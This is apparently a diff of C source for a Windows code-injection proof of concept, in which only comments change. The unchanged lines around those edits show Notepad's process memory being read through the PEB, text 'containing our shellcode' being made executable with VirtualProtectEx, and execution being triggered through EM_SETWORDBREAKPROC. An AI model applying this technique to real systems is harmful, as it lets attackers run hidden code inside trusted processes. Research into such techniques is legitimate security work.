@@ -49,7 +49,7 @@ PVOID get_win_text(HANDLE hp, PDWORD textlen) {
       hp, pbi.PebBaseAddress,
       &peb, sizeof(PEB), &rd);
     
-    // get the address of command line 
+    // get the address of window title
     ReadProcessMemory(
       hp, peb.ProcessParameters,
       &upp, sizeof(RTL_USER_PROCESS_PARAMETERS), &rd);
@@ -170,7 +170,7 @@ void win_text_inject(PWCHAR cmd) {
      
     // wait for process to initialize
     // if you don't wait, there can be a race condition
-    // reading the correct command line from new process  
+    // reading the correct window title address from new process  
     WaitForInputIdle(pi.hProcess, INFINITE);
     
     // the command to execute is just pasted into the notepad
@@ -183,7 +183,7 @@ void win_text_inject(PWCHAR cmd) {
     // which contains our shellcode
     win_title = get_win_text(pi.hProcess, &len);
     
-    // set the address to RWX
+    // set the window title address to RWX
     if(!VirtualProtectEx(pi.hProcess, win_title, 
       len, PAGE_EXECUTE_READWRITE, &old)) {
       xstrerror(L"VirtualProtectEx(RWX)");
@@ -195,7 +195,7 @@ void win_text_inject(PWCHAR cmd) {
     SendMessage(ecw, WM_LBUTTONDBLCLK, MK_LBUTTON, (LPARAM)0x000a000a);
     SendMessage(ecw, EM_SETWORDBREAKPROC, 0, (LPARAM)NULL);
     
-    // set command line to RW
+    // set window title address to RW
     if(!VirtualProtectEx(pi.hProcess, win_title, 
       len, PAGE_READWRITE, &old)) {
       xstrerror(L"VirtualProtectEx(RW)");
